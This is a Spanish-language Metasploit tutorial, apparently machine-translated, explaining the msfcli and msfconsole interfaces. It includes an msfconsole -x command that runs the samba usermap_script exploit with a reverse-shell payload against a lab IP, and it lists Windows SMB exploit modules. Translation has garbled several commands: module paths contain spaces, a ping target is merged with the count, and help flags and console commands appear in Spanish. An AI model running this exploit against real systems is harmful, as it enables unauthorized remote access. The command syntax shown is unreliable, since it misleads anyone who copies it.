# Fundamentos de metasploit

## USO DE LA INTERFAZ MSFCLI

Al aprender a usar Metasploit, encontrará que hay muchas interfaces diferentes para usar con esta herramienta de piratería, cada una con sus propias fortalezas y debilidades. Como tal, no existe una interfaz perfecta para usar con la consola Metasploit, aunque MSFConsole es la única forma compatible de acceder a la mayoría de los comandos de Metasploit. Sin embargo, sigue siendo beneficioso sentirse cómodo con todas las interfaces de Metasploit.

### ¿QUÉ ES EL MSFCLI?

El  msfcli proporciona una potente interfaz de línea de comandos para el marco. Esto le permite agregar fácilmente exploits de Metasploit en cualquier script que pueda crear.

Nota: A partir de 2015-06-18, msfcli ha sido eliminado. Una forma de obtener una funcionalidad similar a través de msfconsole es usando la opción -x. Por ejemplo, el siguiente comando establece todas las opciones para samba / usermap_script y lo ejecuta contra un objetivo:

	┌─[root@cs-academy]─[~]
	└──╼ # msfconsole -x "use exploit / multi / samba / usermap_script; \
	set RHOST 172.16.194.172; \
	set PAYLOAD cmd / unix / reverse; \
	set LHOST 172.16.194.163; \
	run"

### Beneficios de la interfaz MSFcli

- Soporta el lanzamiento de exploits y módulos auxiliares
- Útil para tareas específicas
- Bueno para aprender
- Cómodo de usar al probar o desarrollar un nuevo exploit
- Buena herramienta para explotación puntual
- Excelente si sabe exactamente qué exploit y opciones necesita
- Maravilloso para usar en scripts y automatización básica

El único inconveniente real de msfcli es que no se admite tan bien como msfconsole y solo puede manejar un shell a la vez, lo que lo hace poco práctico para los ataques del lado del cliente. Tampoco es compatible con ninguna de las funciones de automatización avanzadas de msfconsole .

## USO DE LA INTERFAZ DE MSFCONSOLE

### ¿QUÉ ES LA MSFCONSOLE?

El msfconsole es probablemente la interfaz más popular para Metasploit Framework (MSF). Proporciona una consola centralizada "todo en uno" y le permite un acceso eficiente a prácticamente todas las opciones disponibles en MSF. MSFconsole puede parecer intimidante al principio, pero una vez que aprenda la sintaxis de los comandos, aprenderá a apreciar el poder de utilizar esta interfaz.

- Beneficios de usar MSFconsole
- Es la única forma compatible de acceder a la mayoría de las funciones dentro de Metasploit.
- Proporciona una interfaz basada en consola para el marco.
- Contiene la mayoría de las funciones y es la interfaz de MSF más estable
- Soporte completo de readline, tabulación y finalización de comandos
- Es posible la ejecución de comandos externos en msfconsole:
	msf> ping -c 1192.168.1.100
	[*] exec: ping -c 1192.168.1.100
	
	PING 192.168.1.100 (192.168.1.100) 56 (84) bytes de datos.
	64 bytes de 192.168.1.100: icmp_seq = 1 ttl = 128 tiempo = 10,3 ms
	
	--- 192.168.1.100 estadísticas de ping ---
	1 paquete transmitido, 1 recibido, 0% de pérdida de paquete, tiempo 0 ms
	rtt min / avg / max / mdev = 10.308 / 10.308 / 10.308 / 0.000 ms
	msf>


### LANZAMIENTO DE MSFCONSOLE
MSFconsole se inicia simplemente ejecutando msfconsole desde la línea de comandos. MSFconsole se encuentra en el directorio /usr/share/metasploit-framework/msfconsole .

La opción -q elimina el banner de inicio al iniciar msfconsole en modo silencioso.

	┌─[root@cs-academy]─[~]
	└──╼ # msfconsole -q
	msf>

Cómo utilizar el símbolo del sistema
Puede pasar -h a msfconsole para ver las otras opciones de uso disponibles.

	┌─[root@cs-academy]─[~]
	└──╼ # msfconsole -h
	Uso: msfconsole [opciones]
	
	Opciones comunes
	    -E, --environment ENTORNO El entorno de Rails. Utilizará la variable de entorno RAIL_ENV si está configurada. El valor predeterminado es producción si no se establece ninguna opción ni la variable de entorno RAILS_ENV.
	
	Opciones de base de datos
	    -M, --migration-path DIRECTORIO Especifica un directorio que contiene migraciones de base de datos adicionales
	    -n, --no-database Desactiva el soporte de la base de datos
	    -y, --yaml RUTA Especifica un archivo YAML que contiene la configuración de la base de datos
	
	Opciones de marco
	    -c ARCHIVO Carga el archivo de configuración especificado
	    -v, --version Mostrar versión
	
	Opciones de módulo
	        --defer-module-load Aplaza la carga del módulo a menos que se solicite explícitamente.
	    -m, --module-path DIRECTORIO Una ruta de módulo adicional
	
	
	Opciones de consola:
	    -a, --preguntar Preguntar antes de salir de Metasploit o aceptar 'salir -y'
	    -d, --defanged Ejecuta la consola como defanged
	    -L, --real-readline Usa la biblioteca Readline del sistema en lugar de RbReadline
	    -o, --output FILE Salida al archivo especificado
	    -p, --plugin PLUGIN Carga un complemento al inicio
	    -q, --quiet No imprime el banner al inicio
	    -r, --resource FILE Ejecuta el archivo de recursos especificado (- para stdin)
	    -x, --execute-command COMMAND Ejecuta la cadena especificada como comandos de consola (usar; para múltiples)
	    -h, --help Mostrar este mensaje

Ingresando help o un ? una vez en el símbolo del sistema de msf, se mostrará una lista de los comandos disponibles junto con una descripción de para qué se utilizan.

	msf> ayuda
	

### FINALIZACIÓN DE PESTAÑA (auto-completado)
MSFconsole está diseñada para ser de uso rápido y una de las características que ayuda a este objetivo es completar la pestaña. Con la amplia gama de módulos disponibles, puede resultar difícil recordar el nombre exacto y la ruta del módulo en particular que desea utilizar. Al igual que con la mayoría de los otros shells, ingresar lo que sabe y presionar 'Tab' le presentará una lista de opciones disponibles para usted o completará automáticamente la cadena si solo hay una opción. La finalización de tabulación depende de la extensión de ruby ​​readline y casi todos los comandos de la consola admiten la finalización de tabulación.

	use exploit/windows/dce
	use * netapi. *
	set LHOST
	show

Poner un objectivo
	set PAYLOAD windows/shell/
	Exp
	msf> usar exploit/windows/smb/ms
	use exploit/windows/smb/ms03_049_netapi
	use exploit/windows/smb/ms04_007_killbill
	use exploit/windows/smb/ms04_011_lsass
	use exploit /windows/smb/ms04_031_netdde
	use exploit/windows /smb/ms05_039_pnp
	use exploit /windows/smb/ms06_025_rasmans_reg
	use exploit/windows/smb/ms06_025_rras
	use exploit/windows/smb/ms06_040_netapi
	use exploit/windows/smb/ms06_066_nwapi
	use exploit/windows/smb/ms06_066_nwwks
	use exploit/windows/smb/ms06_070_wkssvc
	use exploit/windows/smb/ms07_029_msdns_zonename
	use exploit/windows/smb/ms08_067_netapi
	use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
	use exploit/windows/smb/ms10_046_shortcut_icon_dllloader
	use exploit/windows/smb/ms10_061_spoolss
	use exploit/windows/smb/ms15_020_shortcut_icon_dllloader


	msf> use exploit/windows/smb/ms08_067_netapi

MSFconsole es la interfaz más utilizada para Metasploit. Familiarizarse con estos  comandos de msfconsole le ayudará a lo largo de este curso y le dará una base sólida para trabajar con Metasploit en general.
